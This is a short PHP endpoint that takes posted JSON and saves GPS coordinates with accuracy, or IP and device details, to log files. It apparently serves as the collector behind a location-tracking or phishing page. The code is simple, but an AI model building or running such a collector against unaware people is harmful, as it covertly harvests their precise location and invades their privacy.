<?php
header('Content-Type: application/json');
$data = json_decode(file_get_contents('php://input'), true);
if ($data) {
    $logDir = '../../logs/';
    if (isset($data['lat'])) {
        $file = $logDir . 'result.txt';
        $json = json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]);
        file_put_contents($file, $json);
    } elseif (isset($data['ip'])) {
        $file = $logDir . 'info.txt';
        $json = json_encode($data);
        file_put_contents($file, $json);
    }
}
?>